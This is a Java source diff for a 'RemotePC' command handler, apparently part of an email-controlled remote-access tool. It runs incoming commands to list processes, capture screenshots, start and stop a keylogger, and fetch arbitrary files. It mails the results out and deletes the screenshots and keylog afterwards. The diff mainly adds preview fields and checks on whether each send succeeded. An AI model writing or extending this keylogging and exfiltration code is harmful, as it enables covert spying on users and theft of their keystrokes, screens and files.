@@ -1,7 +1,11 @@
 package email;
 
+import java.io.BufferedReader;
 import java.io.File;
+import java.io.FileReader;
+import java.io.IOException;
 
+import javax.swing.ImageIcon;
 // import java.util.Properties;
 // import javax.mail.Authenticator;
 // import javax.mail.Message;
@@ -88,16 +92,18 @@ import java.io.File;
 public class RemotePC {
 
   String[] message;
+  String fullMessage;
   KeyLog keylog;
   SendMail send;
 
   public RemotePC(String message, KeyLog keylog, SendMail send) {
+    this.fullMessage = message;
     this.message = message.split(":");
     this.keylog = keylog;
     this.send = send;
   }
 
-  public void deleteFile(String path) {
+  private void deleteFile(String path) {
     String filePath = path;
 
     File file = new File(filePath);
@@ -113,15 +119,37 @@ public class RemotePC {
     }
   }
 
+  private String readFile(String filename) {
+    try {
+      FileReader fileReader = new FileReader(filename);
+      BufferedReader bufferedReader = new BufferedReader(fileReader);
+      String line;
+      int count = 0;
+      StringBuilder sb = new StringBuilder();
+      while ((line = bufferedReader.readLine()) != null && count < 10) {
+          sb.append(line).append("\n");
+          count++;
+      }
+      bufferedReader.close();
+      fileReader.close();
+
+      String input = sb.toString();
+      return "<html>" + input.replace("\n", "<br>") + "</html>";
+    } catch (IOException e) {
+        return "";
+    }
+  }
+
   public String run() {
     ProcessPC process = new ProcessPC();
-
+    ServerThreading.statusRunning = fullMessage;
     switch (message[0]) {
       case "process":
         if (message[1].equals("list")) {
           process.listProcess();
           if (send.sendFile("process.txt"))
           {
+            ServerThreading.fileDemo = readFile("process.txt");
             System.out.println("list process");
             return "The process.txt file was sent successfully";
           }
@@ -148,11 +176,16 @@ public class RemotePC {
         System.out.println(message[1]);
         ScreenShot screen = new ScreenShot(message[1]);
         System.out.println("screenshot suscessfull");
+        ServerThreading.screenshotDemo = new ImageIcon(message[1]);
+        ServerThreading.fileDemo = "";
 
-        send.sendFile(message[1]);
-        System.out.println("Send  suscessfull");
-        deleteFile(message[1]);
-        return "screenshot: " + message[1] + " was sent successfully";
+        if (send.sendFile(message[1]))
+        {
+          System.out.println("Send  suscessfull");
+          deleteFile(message[1]);
+          return "screenshot " + message[1] + " was sent successfully";
+        }
+        else return "screenshot was not sent successfully";
         //break;
       case "keylog":
         if (message[1].equals("start")) {
@@ -169,10 +202,14 @@ public class RemotePC {
           if (this.keylog.isLoging == true) {
             this.keylog.isLoging = false;
             this.keylog.stop();
-            send.sendFile("keylog.txt");
-            deleteFile("keylog.txt");
-            System.out.println("stop keylog");
-            return "keylog stopped. keylog.txt was sent successfully";
+            ServerThreading.fileDemo = readFile("keylog.txt");
+            if (send.sendFile("keylog.txt"))
+            {
+              System.out.println("stop keylog");
+              deleteFile("keylog.txt");
+              return "keylog stopped. keylog.txt was sent successfully";
+            }
+            else return "keylog stopped. But keylog.txt was not sent successfully";
           } else {
             System.out.println("keylog is not running");
             return "keylog is not running";
@@ -195,9 +232,15 @@ public class RemotePC {
           path += message[i];
           if (i != message.length-1) path += ':';
         }
-        send.sendFile(path);
-        System.out.println("get file suscessfull");
-        return "File was sent successfully";
+        if (path.endsWith(".txt")) {
+          ServerThreading.fileDemo = readFile(path);
+        }
+        if (send.sendFile(path))
+        {
+          System.out.println("get file suscessfull");
+          return "File was sent successfully";
+        }
+        else return "File error!";
         //break;
       default:
         System.out.println("command not found");
